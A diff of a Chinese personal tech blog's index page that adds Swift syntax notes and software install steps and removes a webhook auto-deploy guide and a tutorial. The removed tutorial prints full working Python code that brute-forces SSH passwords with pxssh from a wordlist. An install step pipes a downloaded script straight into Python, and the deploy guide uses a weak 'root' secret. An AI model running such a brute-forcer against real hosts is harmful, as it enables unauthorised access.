@@ -126,6 +126,154 @@
 	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
 		<div class="meta">
 			<div class="date">
+				<time datetime="2016-10-11T18:15:10+08:00" itemprop="datePublished">2016/10/11</time>
+			</div>
+			<div class="tags">posted in 
+			
+			    <a class='category' href='ios.html'>iOS</a>&nbsp;
+			 
+			</div>
+		</div>
+		<h1 class="title" itemprop="name"><a href="14944977101213.html" itemprop="url">
+		Swift学习要点-基础部分</a></h1>
+		<div class="entry-content" itemprop="articleBody">
+			
+			<p><img src="https://pic.mylonly.com/2016-06-29_15:09:33.jpg" alt="2016-06-29_15:09:33.jpg"/></p>
+
+<blockquote>
+<p>这一系列的文章都是我本人在学习Swift语法过程中认为需要注意的语法部分，所以介绍的并不会很完整。</p>
+</blockquote>
+
+<ol>
+<li><p>print函数:<code>print(_:separator:terminator:)</code>,默认情况下print会以换行符当做结束符，此外你可以通过terminator参数更改结束符，例如:</p>
+
+<pre><code class="language-Swift">print(&quot;正常的print结尾时换行符&quot;)                  //输出:正常的print结尾时换行符\n
+print(&quot;没有换行符的print&quot;,terminator:&quot;&quot;)         //输出:没有换行符的print
+print(&quot;稀奇古怪的结束符都可以&quot;,terminator:&quot;(^^)&quot;)  //输出:稀奇古怪的结束符都可以(^^)
+</code></pre></li>
+<li><p>数值类字面量，包括整数和浮点数可以添加额外的零并且包含下划线，并不会影响字面量的值</p>
+
+<pre><code class="language-Swift">let paddedDouble = 000123.456
+let oneMillion = 1_000_000
+let justOverOneMillion = 1_000_000.000_000_1
+</code></pre></li>
+<li><p>可以通过<code>typealias</code>关键字来定义类型的别名</p>
+
+<pre><code class="language-Swift">typealias AudioSample = UInt16
+var maxAmplitudeFound = AudioSample.min // maxAmplitudeFound 现在是 0
+</code></pre></li>
+<li><p>不同的数据类型之间不会隐式转换,必须要用类型名加上括号的方式进入显示转换,其中显示转换成字符串除了使用String()之外，还可以直接在字符串中适用(其他类型值)来转换</p>
+
+<pre><code class="language-Swift">var maxValue = UInt8.max
+var max64Value = Int64.max
+
+max64Value = maxValue  //Error:Cannot assign value of type &#39;UInt8&#39; to type &#39;Int64&#39;
+max64Value = Int64(maxValue) //Ok
+
+let number = 3
+var str1 = String(number) //str1 = &quot;3&quot;
+var str2 = &quot;\(number)&quot;    //str2 = &quot;3&quot; 
+</code></pre></li>
+<li><p>如果你只需要一部分元组值，分解的时候可以把要忽略的部分用下划线（_）标记：</p>
+
+<pre><code class="language-Swift">let http404Error = (404, &quot;Not Found&quot;)  // http404Error 的类型是 (Int, String)，值是 (404, &quot;Not Found&quot;)
+let (justTheStatusCode, _) = http404Error
+print(&quot;The status code is \(justTheStatusCode)&quot;) // 输出 &quot;The status code is 404&quot;
+</code></pre></li>
+<li><p>Swift 的<code>nil</code>和 Objective-C 中的<code>nil</code>并不一样。在 Objective-C 中，<code>nil</code>是一个指向不存在对象的指针。在 Swift 中，<code>nil</code>不是指针——它是一个确定的值，用来表示值缺失。任何类型的可选状态都可以被设置为<code>nil</code>，不只是对象类型。</p>
+
+<pre><code class="language-Swift">var serverResponseCode: Int? = 404
+// serverResponseCode 包含一个可选的 Int 值 404
+serverResponseCode = nil
+// serverResponseCode 现在不包含值
+</code></pre></li>
+<li><p>使用!来强制解析值之前，一定要确定可选包含一个非nil的值，否则当强制解析一个nil值时会报错。</p>
+
+<pre><code class="language-Swift">var option:Int?    //没有初始值的可选类型变量默认值为nil
+var str = &quot;\(option)&quot; //输出:&quot;nil&quot;
+str = &quot;\(option!)&quot;    //Error
+</code></pre></li>
+<li><p>常量的值一旦被确定就不能修改，但是用let声明常量时可以不必紧跟其后为其设置初始值。</p>
+
+<pre><code class="language-Swift">let const_a:String
+if (condition){
+    const_a = &quot;a&quot;
+}else{
+    const_a = &quot;b&quot;
+}
+</code></pre></li>
+</ol>
+
+
+			
+			
+		</div>
+
+	</article>
+ 
+	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
+		<div class="meta">
+			<div class="date">
+				<time datetime="2016-09-11T19:10:48+08:00" itemprop="datePublished">2016/9/11</time>
+			</div>
+			<div class="tags">posted in 
+			
+			    <a class='category' href='linux.html'>Linux</a>&nbsp;
+			 
+			</div>
+		</div>
+		<h1 class="title" itemprop="name"><a href="14945010480752.html" itemprop="url">
+		各种程序的安装</a></h1>
+		<div class="entry-content" itemprop="articleBody">
+			
+			<ol>
+<li>源码安装nginx</li>
+</ol>
+
+<pre><code>#安装编译nginx必须的依赖
+yum install gcc-c++
+yum install pcre pcre-devel  
+yum install zlib zlib-devel 
+yum install openssl openssl--devel
+
+#下载nginx源码
+wget http://nginx.org/download/nginx-1.9.15.tar.gz
+
+#解压
+tar -zvxf nginx-1.9.15.tar.gz -C ../document/
+
+#编译安装
+cd ../document/nginx-1.9.15
+./configure
+make
+make install
+</code></pre>
+
+<ol>
+<li>setuptools 安装</li>
+</ol>
+
+<pre><code>wget https://bootstrap.pypa.io/ez_setup.py -O - | python
+
+</code></pre>
+
+<ol>
+<li>pip源码安装</li>
+</ol>
+
+<pre><code>[pip官网安装](https://pypi.python.org/pypi/pip)
+</code></pre>
+
+
+			
+			
+		</div>
+
+	</article>
+ 
+	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
+		<div class="meta">
+			<div class="date">
 				<time datetime="2016-09-11T18:16:48+08:00" itemprop="datePublished">2016/9/11</time>
 			</div>
 			<div class="tags">posted in 
@@ -544,240 +692,6 @@ class tbModelPipeline(object):
 <li>这种通过分析Ajax接口直接调用获取原始数据应该是效率最高的抓取数据方式，但并不是所有的Ajax页面都适用，还是要具体对待，比如我们上面获取相册列表当中就要去分析html来获得相册的基本信息。</li>
 <li>获取相册和相册里的照片列表写的比较简略，基本没展示什么代码，这样写是有原因的:一个是因为我已经挂了代码的链接,而且后面这两部分的原理和我主要讲的第一部分获取模特信息的原理基本类似，不想花太多的篇幅花在这种重复的内容上，另外一个我希望想掌握Scrapy的同学能在明白我第一部分的讲解下自己能顺利完成后面的工作，遇到不明白的时候可以看看我Github上的源码，看看有什么不对的地方，只有自己写一遍才能掌握，这是编程界的硬道理。</li>
 </ol>
-
-
-			
-			
-		</div>
-
-	</article>
- 
-	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
-		<div class="meta">
-			<div class="date">
-				<time datetime="2016-07-02T19:09:49+08:00" itemprop="datePublished">2016/7/2</time>
-			</div>
-			<div class="tags">posted in 
-			
-			    <a class='category' href='linux.html'>Linux</a>&nbsp;
-			 
-			</div>
-		</div>
-		<h1 class="title" itemprop="name"><a href="14945009892942.html" itemprop="url">
-		利用Github的Webhook功能和Node.js完成项目的自动部署</a></h1>
-		<div class="entry-content" itemprop="articleBody">
-			
-			<p><u>本文对任何提供Webhook的git仓库都适用</u></p>
-
-<p><img src="https://pic.mylonly.com/2016-06-29_14635623250348.jpg" alt="2016-06-29_14635623250348.jpg"/></p>
-
-<h3 id="toc_0">首先完成Node.js服务器的代码构建，先上代码，再解释</h3>
-
-<pre><code class="language-Node.js">var http = require(&#39;http&#39;)
-var createHandler = require(&#39;github-webhook-handler&#39;)
-var handler = createHandler({ path: &#39;/&#39;, secret: &#39;root&#39; })
-// 上面的 secret 保持和 GitHub 后台设置的一致
-
-function run_cmd(cmd, args, callback) {
-  var spawn = require(&#39;child_process&#39;).spawn;
-  var child = spawn(cmd, args);
-  var resp = &quot;&quot;;
-
-  child.stdout.on(&#39;data&#39;, function(buffer) { resp += buffer.toString(); });
-  child.stdout.on(&#39;end&#39;, function() { callback (resp) });
-}
-
-http.createServer(function (req, res) {
-  handler(req, res, function (err) {
-    res.statusCode = 404
-    res.end(&#39;no such location&#39;)
-  })
-}).listen(7777)
-
-handler.on(&#39;error&#39;, function (err) {
-  console.error(&#39;Error:&#39;, err.message)
-})
-
-handler.on(&#39;push&#39;, function (event) {
-  console.log(&#39;Received a push event for %s to %s&#39;,
-    event.payload.repository.name,
-    event.payload.ref);
-    run_cmd(&#39;sh&#39;, [&#39;./deploy.sh&#39;,event.payload.repository.name], function(text){ console.log(text) });
-})
-</code></pre>
-
-<p>上面的代码中用到了一个<code>github-webhook-handler</code>的中间价，你可以用<code>npm install -g github-webhook-handler</code>来全局安装</p>
-
-<p>还有代码这行:<br/>
-<code><br/>
-var handler = createHandler({ path: &#39;/&#39;, secret: &#39;root&#39; }) <br/>
-</code><br/>
-其中secret后的参数是你在github的项目中添加webhook时设置的secret值，替换成自己的就行了</p>
-
-<h3 id="toc_1">完成deploy.sh脚本</h3>
-
-<p>deploy.sh脚本负责进入项目的目录，然后利用git命令拉取最新的代码，还是直接贴代码:</p>
-
-<pre><code class="language-Bash"> #!/bin/bash
-
-WEB_PATH=&#39;/root/tools/&#39;$1
-WEB_USER=&#39;root&#39;
-WEB_USERGROUP=&#39;root&#39;
-
-echo &quot;Start deployment&quot;
-cd $WEB_PATH
-echo &quot;pulling source code...&quot;
-git reset --hard origin/master
-git clean -f
-git pull
-git checkout master
-echo &quot;changing permissions...&quot;
-chown -R $WEB_USER:$WEB_USERGROUP $WEB_PATH
-echo &quot;Finished.&quot;
-</code></pre>
-
-<p>deploy.sh 会接受第一个参数当做项目名字，然后进入这个项目的目录执行git操作，这个参数是在deploy.js中根据hook返回的项目名字来的，代码应该比较容易懂，都是些简单的git命令。</p>
-
-<blockquote>
-<p>如果是全新的项目，需要在你的服务器上先clone要部署的项目<br/>
-你需要根据自己的实际项目位置，修改WEB_PATH的值</p>
-</blockquote>
-
-<h3 id="toc_2">后台运行deploy.js</h3>
-
-<p>利用Linux提供的nohup命令，让deploy.js运行在后台</p>
-
-<pre><code>nohup node deploy.js &gt; deploy.log &amp;
-</code></pre>
-
-<h3 id="toc_3">去Github后台添加webhook</h3>
-
-<p>进入你需要自动部署的项目的github地址，进入项目的设置页面，点击左侧的<code>Webhooks &amp; services</code><br/>
-<img src="https://pic.mylonly.com/2016-06-29_14635620989191.jpg" alt="2016-06-29_14635620989191.jpg"/></p>
-
-
-			
-			
-		</div>
-
-	</article>
- 
-	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
-		<div class="meta">
-			<div class="date">
-				<time datetime="2016-06-24T19:12:26+08:00" itemprop="datePublished">2016/6/24</time>
-			</div>
-			<div class="tags">posted in 
-			
-			    <a class='category' href='python.html'>Python</a>&nbsp;
-			 
-			</div>
-		</div>
-		<h1 class="title" itemprop="name"><a href="14945011465578.html" itemprop="url">
-		利用pxssh暴力破解ssh密码</a></h1>
-		<div class="entry-content" itemprop="articleBody">
-			
-			<blockquote>
-<p><mark>关于pxssh</mark><br/>
-pxssh 是一个包含了pexpect库的专用脚本,它已经预先为我们写好了login(),logout()和prompt()等函数直接与SSH交互。</p>
-</blockquote>
-
-<h4 id="toc_0">利用pxssh的login函数判断密码是否正确</h4>
-
-<p>由于pxssh.login()函数执行失败会抛出异常，因此我们可以利用try...catch来捕获相应的异常来判断密码是否正确。（PS:其中的connection_lock.release()是信号量得释放操作）</p>
-
-<pre><code class="language-Python">def connect(host,user,password):
-    try:
-        session = pxssh.pxssh()
-        session.login(host,user,password)
-        print(&#39;[+]Password Found:&#39;+password)
-    except Exception,e:
-        print (&#39;[-] Error Connecting:&#39;+str(e))
-    finally:
-        connection_lock.release()
-</code></pre>
-
-<h4 id="toc_1">多线程和信号量</h4>
-
-<p>由于我们准备从一个庞大的字典文件的读取密码，我们决定利用多线程来同时处理多个密码登陆操作用来加快速度。</p>
-
-<pre><code class="language-Python">password_file = open(password,&#39;r&#39;)
-for line in password_file:
-        thread = threading.Thread(target=connect,args=(host,user,password))
-        thread.start()
-</code></pre>
-
-<p>可是像上面的代码,如果password_file是个巨大的密码文件，就为同时产生过多的线程，很容易造成服务器无法响应，为了控制同时存在的线程数量，我们这里采用threading中的BoundedSemaphore来控制最大连接数，也就是最多的允许线程数量,讲上面的代码改成如下这样:</p>
-
-<pre><code class="language-Python">maxConnections = 5
-connection_lock = threading.BoundedSemaphore(maxConnections)
-password_file = open(password,&#39;r&#39;)
-for line in password_file:
-   password = line.strip(&#39;\r&#39;).strip(&#39;\n&#39;)
-   connection_lock.acquire()
-   print(&#39;[-] Testing password:&#39;+str(password))
-   thread = threading.Thread(target=connect,args=(host,user,password))
-   thread.start()
-</code></pre>
-
-<p>最大连接数被设置为5，在每个thread启动时注册一个信号量，在connect函数结束时注销这个信号量，这样同时存在的线程数量就被控制为5个。</p>
-
-<h4 id="toc_2">测试结果</h4>
-
-<p><img src="https://pic.mylonly.com/2016-06-29_14667836697742.jpg" alt="2016-06-29_14667836697742.jpg"/><br/>
-字典文件可以自己生成，或者网上找一些常用字典文件</p>
-
-<h4 id="toc_3">完整代码</h4>
-
-<pre><code class="language-Python">from pexpect import pxssh
-import threading
-import optparse
-import time
-
-maxConnections = 5
-connection_lock = threading.BoundedSemaphore(maxConnections)
-
-def send_command(child,cmd):
-    child.sendline(cmd)
-    child.prompt()
-    print(child.before)
-
-def connect(host,user,password):
-    try:
-        session = pxssh.pxssh()
-        session.login(host,user,password)
-        print(&#39;[+]Password Found:&#39;+password)
-    except Exception,e:
-        print (&#39;[-] Error Connecting:&#39;+str(e))
-    finally:
-        connection_lock.release()
-
-def main():
-    
-    parse = optparse.OptionParser(&#39;Usage %prog &#39;+ \
-        &#39;-H &lt;target host&gt; -u &lt;user&gt; -F &lt;password file&gt;&#39;)
-    parse.add_option(&#39;-H&#39;,dest=&#39;host&#39;,type=&#39;string&#39;,help=&#39;specify target host&#39;)
-    parse.add_option(&#39;-u&#39;,dest=&#39;user&#39;,type=&#39;string&#39;,help=&#39;specify username&#39;)
-    parse.add_option(&#39;-F&#39;,dest=&#39;password&#39;,type=&#39;string&#39;,help=&#39;specify password file&#39;)
-    (options,args) = parse.parse_args()
-
-    host = options.host
-    user = options.user
-    password = options.password
-
-    password_file = open(password,&#39;r&#39;)
-
-    for line in password_file:
-        password = line.strip(&#39;\r&#39;).strip(&#39;\n&#39;)
-        connection_lock.acquire()
-        print(&#39;[-] Testing password:&#39;+str(password))
-        thread = threading.Thread(target=connect,args=(host,user,password))
-        thread.start()
-
-if __name__ == &#39;__main__&#39;:
-    main()
-
-</code></pre>
 
 
 			
